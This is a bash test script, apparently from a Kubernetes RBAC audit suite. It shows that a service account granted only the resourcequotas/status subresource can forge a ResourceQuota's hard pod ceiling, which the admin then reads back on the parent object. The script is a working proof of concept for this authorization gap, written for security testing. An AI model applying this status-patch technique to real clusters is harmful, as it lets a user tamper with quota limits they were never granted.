#!/usr/bin/env bash
# Implicit permission: update resourcequotas/status -> update resourcequotas
#                                            (resourcequotas-status-updates-parent)
#
# Proof: an identity granted ONLY `update/patch resourcequotas/status` cannot
# `update resourcequotas`, yet writing the `/status` subresource mutates the ONE
# stored ResourceQuota object (the status store is a struct copy of the parent
# store). We overwrite `status.hard.pods` via /status and read it back on the
# parent object with a plain `get resourcequotas` (as admin). A ResourceQuota's
# status is the enforced ceiling the quota controller consults, so tampering it
# via /status is a write to the quota the attacker was never granted.
# Mechanism: ../transitions/status-subresource-updates-parent.md
source "$(dirname "$0")/../lib.sh"
test_start "resourcequotas-status-updates-parent"

# Local cleanup is defensive redundancy: lib.sh uses a FILE-backed cleanup
# ledger (WP_CLEANUP_FILE) that survives the $(...) subshell of new_ns /
# grant_cluster, so the harness _cleanup already deletes tracked objects on
# exit. We additionally track our own objects here (and, for cluster-scoped
# tests, create them with names we control) and chain our trap ahead of
# lib's _cleanup.
WP_OBJS=()
wp_track() { WP_OBJS+=("$1"); }
wp_cleanup() {
  local rc=$? o
  for o in "${WP_OBJS[@]:-}"; do [ -n "$o" ] && K delete "$o" --ignore-not-found --wait=false >/dev/null 2>&1 || true; done
  _cleanup || true
  return $rc
}
trap wp_cleanup EXIT

ns="$(new_ns rq-status)"; wp_track "namespace/$ns"

step "admin creates ResourceQuota 'victim' (hard pods=10)"
K -n "$ns" create quota victim --hard=pods=10 >/dev/null || fail "could not create resourcequota"

mk_sa "$ns" attacker
# ONLY the resourcequotas/status subresource (get/update/patch -- a merge-patch
# of a subresource first GETs that same subresource, so `get` is still
# status-only access, i.e. p). Plus a parent read, purely to OBSERVE.
grant_ns "$ns" attacker "" "resourcequotas/status" "get,update,patch"
grant_ns "$ns" attacker "" "resourcequotas"        "get,list"
subj="$(sa_subject "$ns" attacker)"

assert_can    "$subj" update resourcequotas/status "$ns"   # holds p
assert_cannot "$subj" update resourcequotas        "$ns"   # THE GAP: lacks q
assert_cannot "$subj" patch  resourcequotas        "$ns"

step "attacker PATCHes resourcequotas/status to forge status.hard.pods=99 (never touching the parent verb)"
as_subj "$subj" -n "$ns" patch resourcequota victim --subresource=status --type=merge -p \
  '{"status":{"hard":{"pods":"99"}}}' >/dev/null || fail "attacker could not patch resourcequotas/status"

# EFFECT: the write landed on the parent ResourceQuota object -- a plain
# `get resourcequotas` (the q the attacker lacks) returns the forged ceiling.
got=""
for _ in $(seq 1 10); do
  got="$(K -n "$ns" get resourcequota victim -o jsonpath='{.status.hard.pods}' 2>/dev/null)"
  [ "$got" = "99" ] && break
  sleep 1
done
assert_eq "$got" "99" "status write via /status reached the parent ResourceQuota object"
step "attacker's /status write (hard.pods=99) is visible on the parent ResourceQuota via 'get resourcequotas'"

test_pass
